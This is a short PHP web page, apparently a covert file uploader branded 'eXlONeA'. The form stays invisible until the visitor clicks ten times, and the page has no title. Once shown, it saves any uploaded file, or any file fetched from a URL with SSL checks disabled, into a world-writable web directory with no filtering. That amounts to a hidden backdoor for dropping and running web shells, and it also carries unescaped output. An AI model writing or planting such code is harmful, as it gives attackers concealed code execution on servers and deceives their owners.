<?php
$uploadDir = 'exlonea/';
$successMessage = "";

// Dosya yükleme işlemi
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['file'])) {
    if (!is_dir($uploadDir)) {
        mkdir($uploadDir, 0777, true);
    }
    $targetFile = $uploadDir . basename($_FILES['file']['name']);
    if (move_uploaded_file($_FILES['file']['tmp_name'], $targetFile)) {
        $successMessage = "<div class='alert success'>Dosya başarıyla yüklendi: <a href='$targetFile' target='_blank'>$targetFile</a></div>";
    } else {
        $successMessage = "<div class='alert error'>Dosya yüklenirken bir hata oluştu.</div>";
    }
}

// Link ile dosya indirme işlemi (cURL ile)
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['file_link'])) {
    if (!is_dir($uploadDir)) {
        mkdir($uploadDir, 0777, true);
    }

    $fileLink = filter_var($_POST['file_link'], FILTER_VALIDATE_URL); // Güvenlik için URL doğrulaması
    if (!$fileLink) {
        $successMessage = "<div class='alert error'>Geçersiz URL!</div>";
    } else {
        $fileName = basename(parse_url($fileLink, PHP_URL_PATH));
        $targetFile = $uploadDir . $fileName;

        // cURL ile dosya indirme
        $ch = curl_init($fileLink);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Gerekirse SSL doğrulamasını devre dışı bırak
        $fileContent = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        if ($httpCode == 200 && $fileContent !== false && file_put_contents($targetFile, $fileContent)) {
            $successMessage = "<div class='alert success'>Dosya başarıyla indirildi ve kaydedildi: <a href='$targetFile' target='_blank'>$targetFile</a></div>";
        } else {
            $successMessage = "<div class='alert error'>Dosya indirilemedi veya kaydedilemedi.</div>";
        }
    }
}

$currentFile = basename($_SERVER['PHP_SELF']);
?>

<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <link href="https://fonts.googleapis.com/css2?family=Cinzel+Decorative:wght@400&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #ffffff;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
            padding: 0 15px;
            box-sizing: border-box;
        }
        .container {
            width: 100%;
            max-width: 400px;
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.3);
            text-align: center;
            margin: 10px 0;
            box-sizing: border-box;
            display: none;
            border: 3px solid #000000;
        }
        .header {
            background-color: #000000;
            padding: 15px;
            border-radius: 10px 10px 0 0;
            margin: -20px -20px 20px -20px;
        }
        .header h1 {
            font-family: 'Cinzel Decorative', serif;
            font-size: 40px;
            color: white;
            letter-spacing: 2px;
            font-weight: 400;
        }
        .header h1 span {
            color: #ffffff;
        }
        .header a {
            text-decoration: none;
            color: white;
        }
        input, button {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
            box-sizing: border-box;
        }
        button {
            background-color: #000000;
            color: white;
            border: none;
            cursor: pointer;
            font-size: 16px;
        }
        button:hover {
            background-color: #222222;
        }
        .alert {
            padding: 10px;
            margin-top: 15px;
            border-radius: 5px;
        }
        .alert.success {
            background-color: #d4edda;
            color: #155724;
        }
        .alert.error {
            background-color: #f8d7da;
            color: #721c24;
        }
        .file-upload-wrapper {
            display: flex;
            justify-content: center;
            align-items: center;
            width: 100%;
        }
        .file-upload-button {
            background-color: #000000;
            color: white;
            padding: 12px;
            text-align: center;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            width: 100%;
            border: none;
            display: block;
        }
        .file-upload-button:hover {
            background-color: #222222;
        }
        input[type="file"] {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container" id="formContainer">
        <div class="header">
            <a href="<?php echo $currentFile; ?>"><h1>e<span>X</span>lONeA</h1></a>
        </div>

        <form action="" method="POST" enctype="multipart/form-data">
            <div class="file-upload-wrapper">
                <label for="fileInput" class="file-upload-button"><i class="fas fa-upload"></i> Dosya Seç</label>
                <input type="file" id="fileInput" name="file" required onchange="updateFileName()">
            </div>
            <span id="fileName" style="display: block; margin-top: 10px; font-weight: bold;"></span>
            <button type="submit"><i class="fas fa-cloud-upload-alt"></i> Yükle</button>
        </form>

        <form action="" method="POST">
            <input type="url" name="file_link" placeholder="Dosya linkini girin" required>
            <button type="submit"><i class="fas fa-link"></i> Ekle</button>
        </form>

        <?php if ($successMessage) echo $successMessage; ?>
    </div>
    <div class="footer" style="color:#a2a2a2; display: none;" id="footer">Copyright © Exlonea - 2025</div>

    <script>
        let clickCount = 0;
        document.body.addEventListener("click", function() {
            clickCount++;
            if (clickCount >= 10) {
                document.getElementById("formContainer").style.display = "block";
                document.getElementById("footer").style.display = "block";}
            });

            function updateFileName() {
                var fileInput = document.getElementById('fileInput');
                var fileName = document.getElementById('fileName');
                fileName.textContent = fileInput.files[0] ? fileInput.files[0].name : '';
            }
        </script>
    </body>
</html>